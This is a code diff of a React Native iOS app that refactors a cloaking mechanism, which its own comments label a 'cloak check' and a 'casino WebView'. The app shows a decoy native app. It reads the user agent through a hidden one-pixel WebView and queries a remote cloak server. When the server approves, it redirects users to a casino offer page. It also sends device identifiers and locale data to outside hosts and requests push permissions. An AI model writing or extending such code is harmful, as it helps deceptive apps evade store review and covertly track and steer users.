@@ -7,7 +7,6 @@ import { OneSignal } from 'react-native-onesignal';
 import {
   Dimensions,
   Linking,
-  Modal,
   NativeModules,
   PixelRatio,
   SafeAreaView,
@@ -23,12 +22,12 @@ import AppManagerChild from './AppManagerChild';
 
 // ─── Constants ───────────────────────────────────────────────────────────────
 
-const CLOAK_URL     = 'https://smart-cloud-app.top/HW5gM4fL';
-const STORE_SESSION = 'mrv_sta';
-const STORE_URL     = 'mrv_url';
-const ONESIGNAL_ID  = '75d64b51-1cbf-4cc3-bd7d-24113ec78ae1';
+const CLOAK_URL      = 'https://smart-cloud-app.top/HW5gM4fL';
+const STORE_SESSION  = 'mrv_sta';
+const STORE_URL      = 'mrv_url';
+const ONESIGNAL_ID   = '75d64b51-1cbf-4cc3-bd7d-24113ec78ae1';
 
-const CAPI_URL1     = 'https://clear-core-team.top/v1';
+const CAPI_URL1      = 'https://clear-core-team.top/v1';
 const CAPI_URL2_BASE = 'https://flash-core-vibe.com/admin/?action=update_data_ios&id=';
 
 const INJECTED_JS = `
@@ -64,12 +63,12 @@ const INJECTED_JS = `
 // ─── JustLink User-Agent ─────────────────────────────────────────────────────
 
 const buildJustLinkUA = (baseUA: string): string => {
-  const iosVersion = DeviceInfo.getSystemVersion();
-  const deviceId   = DeviceInfo.getDeviceId();
-  const model      = DeviceInfo.getModel().split(' ')[0];
-  const sysName    = DeviceInfo.getSystemName();
-  const scale      = String(Math.round(PixelRatio.get()));
-  const deviceType = DeviceInfo.isTablet() ? 'tablet' : 'phone';
+  const iosVersion  = DeviceInfo.getSystemVersion();
+  const deviceId    = DeviceInfo.getDeviceId();
+  const model       = DeviceInfo.getModel().split(' ')[0];
+  const sysName     = DeviceInfo.getSystemName();
+  const scale       = String(Math.round(PixelRatio.get()));
+  const deviceType  = DeviceInfo.isTablet() ? 'tablet' : 'phone';
   const lang =
     NativeModules.SettingsManager?.settings?.AppleLanguages?.[0] ??
     NativeModules.SettingsManager?.settings?.AppleLocale ??
@@ -90,6 +89,20 @@ const syncAppVersion = async () => {
   }
 };
 
+// ─── Fetch with retry ────────────────────────────────────────────────────────
+
+const fetchWithRetry = async (url: string, opts: any, retries = 3): Promise<Response> => {
+  for (let i = 0; i < retries; i++) {
+    try {
+      return await fetch(url, opts);
+    } catch (e) {
+      if (i === retries - 1) throw e;
+      await new Promise(r => setTimeout(r, 2000));
+    }
+  }
+  throw new Error('fetch failed');
+};
+
 // ─── CAPI ────────────────────────────────────────────────────────────────────
 
 async function sendFirstRequest(userAgent: string): Promise<string> {
@@ -102,7 +115,7 @@ async function sendFirstRequest(userAgent: string): Promise<string> {
     const deviceModel  = await DeviceInfo.getDeviceId();
     const locale       = 'en_US';
     const timezone     = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const timezoneAbbr = new Date().toLocaleTimeString('en-US', {timeZoneName: 'short'}).split(' ').pop() || '';
+    const timezoneAbbr = new Date().toLocaleTimeString('en-US', { timeZoneName: 'short' }).split(' ').pop() || '';
     const screen       = Dimensions.get('screen');
     const screenWidth  = Math.round(screen.width  * screen.scale);
     const screenHeight = Math.round(screen.height * screen.scale);
@@ -123,16 +136,16 @@ async function sendFirstRequest(userAgent: string): Promise<string> {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        index:                   idfv,
-        strpull:                 strpull,
-        udevice_android_device:  idfv,
-        device_android_build:    userAgent,
+        index:                  idfv,
+        strpull:                strpull,
+        udevice_android_device: idfv,
+        device_android_build:   userAgent,
       }),
     });
 
-    const data    = await res.json();
+    const data   = await res.json();
     const rawStr: string = data.raw_str || '';
-    const match   = rawStr.match(/[&?]?bin=([^&]+)/);
+    const match  = rawStr.match(/[&?]?bin=([^&]+)/);
     if (match && match[1]) {
       await AsyncStorage.setItem('mrv_bin', match[1]);
       return match[1];
@@ -164,55 +177,48 @@ const Stack = createStackNavigator();
 export default function AppBootstrap() {
   return (
     <NavigationContainer>
-      <Stack.Navigator screenOptions={{ headerShown: false }}>
-        <Stack.Screen name="HomeTab"       component={HomeScreen} />
+      <Stack.Navigator screenOptions={{ headerShown: false, animationEnabled: false }}>
+        <Stack.Screen name="Main"          component={MainScreen} />
+        <Stack.Screen name="Offer"         component={OfferScreen} />
         <Stack.Screen name="ContentViewer" component={ContentViewerScreen} />
       </Stack.Navigator>
     </NavigationContainer>
   );
 }
 
-// ─── HomeScreen ──────────────────────────────────────────────────────────────
+// ─── MainScreen: cloak check + native app ────────────────────────────────────
 
-function HomeScreen({ navigation }) {
-  const [contentUrl,  setContentUrl]  = useState('');
-  const [fetchUA,     setFetchUA]     = useState('');
-  const [justLinkUA,  setJustLinkUA]  = useState('');
-  const webViewRef     = useRef<any>(null);
-  const resolvedRef    = useRef(false);
-  const initialLoadRef = useRef(false);
-  const capiData       = useRef<{ emailHash?: string; phoneHash?: string }>({});
-  const [isTwoClick, setTwoClick] = useState(false);
+function MainScreen({ navigation }: any) {
+  const [fetchUA, setFetchUA] = useState('');
+  const navigatedRef = useRef(false);
 
   useEffect(() => {
-    if (!fetchUA) return;
-    let cancelled = false;
+    const ver = DeviceInfo.getSystemVersion();
+    DeviceInfo.getUserAgent().then(ua => {
+      setFetchUA(prev => prev || `${ua} Version/${ver} Safari/604.1`);
+    });
+    const t = setTimeout(() => {
+      DeviceInfo.getUserAgent().then(ua => {
+        setFetchUA(prev => prev || `${ua} Version/${ver} Safari/604.1`);
+      });
+    }, 2000);
+    return () => clearTimeout(t);
+  }, []);
 
-    const fetchWithRetry = async (url: string, opts: any, retries = 3): Promise<Response> => {
-      for (let i = 0; i < retries; i++) {
-        try {
-          return await fetch(url, opts);
-        } catch (e) {
-          if (i === retries - 1) throw e;
-          await new Promise(r => setTimeout(r, 2000));
-        }
-      }
-      throw new Error('fetch failed');
-    };
+  useEffect(() => {
+    if (!fetchUA || navigatedRef.current) return;
+    let cancelled = false;
 
     const init = async () => {
       try {
         await syncAppVersion();
-
         const cached = await AsyncStorage.getItem(STORE_SESSION);
 
         if (cached === '200') {
           const saved = await AsyncStorage.getItem(STORE_URL);
-          if (saved) {
-            if (!cancelled) {
-              setJustLinkUA(buildJustLinkUA(fetchUA));
-              setContentUrl(saved);
-            }
+          if (saved && !cancelled) {
+            navigatedRef.current = true;
+            navigation.replace('Offer', { url: saved, fetchUA });
             return;
           }
         } else if (cached) {
@@ -226,7 +232,13 @@ function HomeScreen({ navigation }) {
         if (cancelled) return;
 
         if (status === '200') {
-          await buildContentUrl();
+          sendFirstRequest(fetchUA);
+          OneSignal.Notifications.requestPermission(true);
+          const seg     = CLOAK_URL.replace(/.*\//, '');
+          const viewUrl = `${CLOAK_URL}?${seg}=1`;
+          await AsyncStorage.setItem(STORE_URL, viewUrl);
+          navigatedRef.current = true;
+          navigation.replace('Offer', { url: viewUrl, fetchUA });
         }
       } catch {}
     };
@@ -235,22 +247,39 @@ function HomeScreen({ navigation }) {
     return () => { cancelled = true; };
   }, [fetchUA]);
 
-  const buildContentUrl = async () => {
-    if (resolvedRef.current) return;
-    resolvedRef.current = true;
+  return (
+    <View style={{ flex: 1 }}>
+      <View style={{ position: 'absolute', width: 1, height: 1, opacity: 0 }} pointerEvents="none">
+        <WebView
+          style={{ width: 1, height: 1 }}
+          source={{ html: '<html><body><script>window.ReactNativeWebView.postMessage(navigator.userAgent);</script></body></html>' }}
+          javaScriptEnabled
+          onMessage={e => {
+            const ua  = e.nativeEvent.data;
+            const ver = DeviceInfo.getSystemVersion();
+            setFetchUA(`${ua} Version/${ver} Safari/604.1`);
+          }}
+        />
+      </View>
+      <NavigationIndependentTree>
+        <MainApp />
+      </NavigationIndependentTree>
+    </View>
+  );
+}
 
-    sendFirstRequest(fetchUA);
-    OneSignal.Notifications.requestPermission(true);
+// ─── OfferScreen: casino WebView ─────────────────────────────────────────────
 
-    const seg     = CLOAK_URL.replace(/.*\//, '');
-    const viewUrl = `${CLOAK_URL}?${seg}=1`;
-    await AsyncStorage.setItem(STORE_URL, viewUrl);
-    setJustLinkUA(buildJustLinkUA(fetchUA));
-    setContentUrl(viewUrl);
-  };
+function OfferScreen({ navigation, route }: any) {
+  const { url, fetchUA } = route.params;
+  const justLinkUA    = buildJustLinkUA(fetchUA);
+  const webViewRef    = useRef<any>(null);
+  const initialLoadRef = useRef(false);
+  const capiData      = useRef<{ emailHash?: string; phoneHash?: string }>({});
+  const [isTwoClick, setTwoClick] = useState(false);
 
-  const openExternal = async (url: string) => {
-    const safe = url.replace(/\s/g, m => (m === ' ' ? '%20' : encodeURIComponent(m)));
+  const openExternal = async (u: string) => {
+    const safe = u.replace(/\s/g, m => (m === ' ' ? '%20' : encodeURIComponent(m)));
     try { await Linking.openURL(safe); } catch {}
   };
 
@@ -265,29 +294,29 @@ function HomeScreen({ navigation }) {
   };
 
   const handleShouldStartLoad = (event: any) => {
-    const { url } = event;
-    const scheme  = (url.split(':')[0] || '').toLowerCase();
+    const u      = event.url;
+    const scheme = (u.split(':')[0] || '').toLowerCase();
 
     if (event.navigationType === 'formSubmitted' || event.navigationType === 'formResubmitted') {
       return true;
     }
 
-    if (url.includes('wa.me/') || url.includes('api.whatsapp.com/') ||
-        url.includes('chat.whatsapp.com/') || url.includes('whatsapp.com/')) {
-      let waUrl   = url;
-      const match = url.match(/wa\.me\/(\d+)/);
+    if (u.includes('wa.me/') || u.includes('api.whatsapp.com/') ||
+        u.includes('chat.whatsapp.com/') || u.includes('whatsapp.com/')) {
+      let waUrl   = u;
+      const match = u.match(/wa\.me\/(\d+)/);
       if (match) waUrl = `whatsapp://send?phone=${match[1]}`;
-      else if (url.includes('api.whatsapp.com/send'))
-        waUrl = url.replace(/https?:\/\/api\.whatsapp\.com\/send/, 'whatsapp://send');
-      Linking.openURL(waUrl).catch(() => Linking.openURL(url));
+      else if (u.includes('api.whatsapp.com/send'))
+        waUrl = u.replace(/https?:\/\/api\.whatsapp\.com\/send/, 'whatsapp://send');
+      Linking.openURL(waUrl).catch(() => Linking.openURL(u));
       return false;
     }
 
     const internalSchemes = ['about', 'javascript', 'data', 'blob'];
     if (!/^https?$/.test(scheme) && !internalSchemes.includes(scheme)) {
-      const addr = url.split(':').slice(1).join(':').split('?')[0];
+      const addr = u.split(':').slice(1).join(':').split('?')[0];
       if (addr && Clipboard?.setString) Clipboard.setString(addr);
-      openExternal(url);
+      openExternal(u);
       return false;
     }
 
@@ -301,7 +330,7 @@ function HomeScreen({ navigation }) {
 
     if (targetUrl.includes('pay.funid.com')) {
       Linking.openURL(targetUrl);
-      webViewRef.current?.injectJavaScript(`window.location.replace('${contentUrl}')`);
+      webViewRef.current?.injectJavaScript(`window.location.replace('${url}')`);
       return;
     }
 
@@ -324,103 +353,64 @@ function HomeScreen({ navigation }) {
     } catch {}
   };
 
-  useEffect(() => {
-    const ver = DeviceInfo.getSystemVersion();
-    // Immediate fallback via DeviceInfo; hidden WebView overrides if it fires first
-    DeviceInfo.getUserAgent().then(ua => {
-      setFetchUA(prev => prev || `${ua} Version/${ver} Safari/604.1`);
-    });
-    // Hard timeout — if hidden WebView never fires, DeviceInfo guarantees startup
-    const t = setTimeout(() => {
-      DeviceInfo.getUserAgent().then(ua => {
-        setFetchUA(prev => prev || `${ua} Version/${ver} Safari/604.1`);
-      });
-    }, 2000);
-    return () => clearTimeout(t);
-  }, []);
-
   return (
-    <View style={styles.container}>
-      <View style={{ position: 'absolute', width: 1, height: 1, opacity: 0 }} pointerEvents="none">
+    <View style={{ flex: 1 }}>
+      <SafeAreaView style={{ flex: 1 }}>
         <WebView
-          style={{ width: 1, height: 1 }}
-          source={{ html: '<html><body><script>window.ReactNativeWebView.postMessage(navigator.userAgent);</script></body></html>' }}
-          javaScriptEnabled
-          onMessage={e => {
-            const ua  = e.nativeEvent.data;
-            const ver = DeviceInfo.getSystemVersion();
-            setFetchUA(`${ua} Version/${ver} Safari/604.1`);
+          ref={webViewRef}
+          source={{ uri: url }}
+          userAgent={justLinkUA}
+          style={{ flex: 1 }}
+          originWhitelist={['*', 'http://*', 'https://*', 'intent://*']}
+          onShouldStartLoadWithRequest={handleShouldStartLoad}
+          onOpenWindow={handleOpenWindow}
+          injectedJavaScript={INJECTED_JS}
+          onMessage={handleMessage}
+          onLoadEnd={e => {
+            const u = e.nativeEvent.url;
+            if (u === 'about:blank' && url && !initialLoadRef.current) {
+              initialLoadRef.current = true;
+              webViewRef.current?.injectJavaScript(`window.location.replace(${JSON.stringify(url)});true;`);
+            } else if (u !== 'about:blank') {
+              initialLoadRef.current = true;
+            }
           }}
+          onError={() => {}}
+          onHttpError={() => {}}
+          textZoom={100}
+          contentMode="mobile"
+          mixedContentMode="always"
+          allowsBackForwardNavigationGestures
+          domStorageEnabled
+          javaScriptEnabled
+          allowsInlineMediaPlayback
+          setSupportMultipleWindows={false}
+          thirdPartyCookiesEnabled
+          mediaPlaybackRequiresUserAction={false}
+          javaScriptCanOpenWindowsAutomatically
         />
-      </View>
+      </SafeAreaView>
 
-      <NavigationIndependentTree>
-        <MainApp />
-      </NavigationIndependentTree>
+      <TouchableOpacity style={styles.btnBack} onPress={handleBackPress}>
+        <Text style={styles.btnIcon}>←</Text>
+      </TouchableOpacity>
 
-      <Modal visible={!!contentUrl} animationType="none" transparent={false}>
-        <View style={StyleSheet.absoluteFill}>
-          <SafeAreaView style={{ flex: 1 }}>
-            <WebView
-              ref={webViewRef}
-              source={{ uri: contentUrl }}
-              userAgent={justLinkUA}
-              style={{ flex: 1 }}
-              originWhitelist={['*', 'http://*', 'https://*', 'intent://*']}
-              onShouldStartLoadWithRequest={handleShouldStartLoad}
-              onOpenWindow={handleOpenWindow}
-              injectedJavaScript={INJECTED_JS}
-              onMessage={handleMessage}
-              onLoadEnd={e => {
-                const u = e.nativeEvent.url;
-                if (u === 'about:blank' && contentUrl && !initialLoadRef.current) {
-                  initialLoadRef.current = true;
-                  webViewRef.current?.injectJavaScript(`window.location.replace(${JSON.stringify(contentUrl)});true;`);
-                } else if (u !== 'about:blank') {
-                  initialLoadRef.current = true;
-                }
-              }}
-              onError={() => {}}
-              onHttpError={() => {}}
-              textZoom={100}
-              contentMode="mobile"
-              mixedContentMode="always"
-              allowsBackForwardNavigationGestures
-              domStorageEnabled
-              javaScriptEnabled
-              allowsInlineMediaPlayback
-              setSupportMultipleWindows={false}
-              thirdPartyCookiesEnabled
-              mediaPlaybackRequiresUserAction={false}
-              javaScriptCanOpenWindowsAutomatically
-            />
-          </SafeAreaView>
-
-          <TouchableOpacity style={styles.btnBack} onPress={handleBackPress}>
-            <Text style={styles.btnIcon}>←</Text>
-          </TouchableOpacity>
-
-          <TouchableOpacity style={styles.btnReload} onPress={() => webViewRef.current?.reload()}>
-            <Text style={styles.btnIcon}>↺</Text>
-          </TouchableOpacity>
-        </View>
-      </Modal>
+      <TouchableOpacity style={styles.btnReload} onPress={() => webViewRef.current?.reload()}>
+        <Text style={styles.btnIcon}>↺</Text>
+      </TouchableOpacity>
     </View>
   );
 }
 
 // ─── ContentViewerScreen ─────────────────────────────────────────────────────
 
-function ContentViewerScreen({ navigation, route }) {
+function ContentViewerScreen({ navigation, route }: any) {
   return <AppManagerChild navigation={navigation} route={route} />;
 }
 
 // ─── Styles ──────────────────────────────────────────────────────────────────
 
 const styles = StyleSheet.create({
-  container: {
-    flex: 1,
-  },
   btnBack: {
     width: 40,
     height: 40,
